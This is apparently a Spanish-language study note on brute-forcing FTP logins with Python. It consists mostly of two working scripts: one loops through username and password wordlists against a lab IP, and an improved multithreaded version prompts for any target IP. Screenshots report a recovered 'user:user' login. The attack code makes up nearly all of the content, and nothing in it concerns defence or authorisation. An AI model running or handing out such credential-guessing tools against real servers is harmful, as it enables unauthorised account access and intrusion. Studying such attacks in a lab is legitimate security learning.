Para ello vamos a utilizar la librería ftplib y tener dos ficheros de textos donde uno contenga los posibles usuarios y otro las posibles contraseñas:
![[Pasted image 20221217090603.png]]
![[Pasted image 20221217090607.png]]
Y a continuación utilizamos este código donde se hará el ataque de fuerza bruta FTP utilizando estos dos ficheros de texto:
```python
import ftplib

def ataque(ip,usuario,password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(usuario,password)
        ftp.quit()
        print('User: {}:{}'.format(usuario,password))
    except:
        print("Falló la autenticación")

ip = '10.10.0.0'
usuarios = open('usuarios.txt','r')
usuarios = usuarios.read().split('\n')
passwords = open('passwords.txt','r')
passwords = passwords.read().split('\n')

for u in usuarios:
    for p in passwords:
        ataque(ip,u,p)
```
Y si lanzamos el script vemos que nos encuentra un login correcto con el usuario y contraseña user:user:+
![[Pasted image 20221217090641.png]]
Y vemos que si probamos con user y user nos inicia la sesión:

![[Pasted image 20221217090651.png]]
O incluso se puede mejorar este código:
```python
import ftplib
import threading
import signal
import argparse

# Crea un objeto ArgumentParser
parser = argparse.ArgumentParser(description='Inserte los diccionarios')

# Agrega argumentos posicionales
parser.add_argument('users', help='Archivo con los usuarios')
parser.add_argument('passwords', help='Archivo con las contraseñas')

# Analiza los argumentos de la línea de comandos
args = parser.parse_args()

# Variable global para controlar la terminación de hilos
terminate_threads = False

def iniciar_sesion(ip, usuario, password):
    global terminate_threads
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(usuario, password)
        ftp.quit()
        print('User: {}:{}'.format(usuario, password))
        # Si se encuentra una combinación válida, configuramos la bandera para detener los otros hilos
        terminate_threads = True
    except Exception as e:
        if terminate_threads:
            return
        pass  # No se imprime nada en caso de fallo

# Función para iniciar sesión en paralelo
def iniciar_sesiones_concurrentes(usuarios, contrasenas, ip):
    global terminate_threads
    threads = []
    for u in usuarios:
        for p in contrasenas:
            thread = threading.Thread(target=iniciar_sesion, args=(ip, u, p))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

# Manejar la señal de Ctrl+C para detener el script
def handle_interrupt(signum, frame):
    global terminate_threads
    terminate_threads = True

signal.signal(signal.SIGINT, handle_interrupt)

ip = input("Introduce la IP objetivo: ")
with open(args.users, 'r') as usuarios_file, open(args.passwords, 'r') as contrasenas_file:
    usuarios = usuarios_file.read().split('\n')
    contrasenas = contrasenas_file.read().split('\n')

try:
    iniciar_sesiones_concurrentes(usuarios, contrasenas, ip)
except KeyboardInterrupt:
    pass
```
Y este sería el resultado:
![[Pasted image 20231012121522.png]]
